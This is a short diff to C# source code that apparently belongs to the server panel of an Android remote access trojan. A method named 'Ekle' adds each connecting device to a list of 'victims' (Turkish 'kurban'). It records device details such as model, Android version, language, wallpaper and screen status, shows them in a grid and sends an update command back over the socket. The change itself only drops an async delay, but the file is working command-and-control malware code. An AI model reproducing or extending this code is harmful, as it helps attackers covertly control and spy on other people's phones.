@@ -1359,10 +1359,10 @@ namespace SV
             }
         }
         public static int topOf = 0;
-        public async void Ekle(Socket socettte, string idimiz, string makine_ismi,
+        public void Ekle(Socket socettte, string idimiz, string makine_ismi,
             string ulke_dil, string uretici_model, string android_ver, string wallpaper, string idenfication,
             string screeenstatus, string devicename)
-        {
+        {           
             kurban_listesi.Add(new Kurbanlar(socettte, idimiz, idenfication));
             int rowId = dataGridView1.Rows.Add();
             DataGridViewRow row = dataGridView1.Rows[rowId];
@@ -1392,10 +1392,9 @@ namespace SV
             metroLabel2.Text = "Online: " + dataGridView1.Rows.Count.ToString();
             listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + socettte.Handle.ToString() +
                           " socket in list. => " + makine_ismi + "/" + socettte.RemoteEndPoint.ToString());
+            
             byte[] upup = MyDataPacker("MYUPDATE", Encoding.UTF8.GetBytes("ECHO"));
             try { socettte.Send(upup, 0, upup.Length, SocketFlags.None); } catch { }
-            await Task.Delay(1);
-            topOf += 125;
 
         }
         public UploadProgress FindUploadProgressById(string ident)
